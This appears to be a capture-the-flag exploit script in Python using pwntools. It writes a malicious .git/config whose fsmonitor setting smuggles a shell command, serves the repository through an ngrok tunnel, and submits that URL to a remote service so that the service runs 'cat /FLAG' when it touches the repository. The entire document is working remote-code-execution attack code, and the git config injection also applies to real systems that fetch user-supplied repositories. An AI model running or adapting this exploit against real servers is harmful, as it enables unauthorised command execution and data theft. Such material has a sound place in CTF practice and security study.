from pwn import *
import os
import re

# reference: https://lwn.net/Articles/892755/

RMT = "52.59.124.14",  10001
MYGIT = "http://0.tcp.ap.ngrok.io:17745/.git/"

CONFIG = """
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        fsmonitor = "echo \\"Pwned as $(%s)\\">&2; false"
"""

context.log_level = "WARNING"

class Exploit:
    def __init__(self, cmd, rmt=RMT, git=MYGIT, configTemplate=CONFIG):
        self.rmt = rmt
        self.git = git
        self.cmd = cmd
        self.configTemplate = configTemplate
        if not os.path.exists(".git/"):
            os.system("git init")
        
    def conn(self, cmd):
        r = remote(*RMT)
        r.sendlineafter(b"Please provide an URL: ", bytes(cmd, "utf-8"))
        return r
    
    def rceConfig(self, cmd):
        with open(".git/config", "w") as f:
            f.write(self.configTemplate % cmd)
        return None
    
    def start(self):
        self.rceConfig(self.cmd)
        self.conn(self.git).interactive()

Exploit("cat /FLAG").start()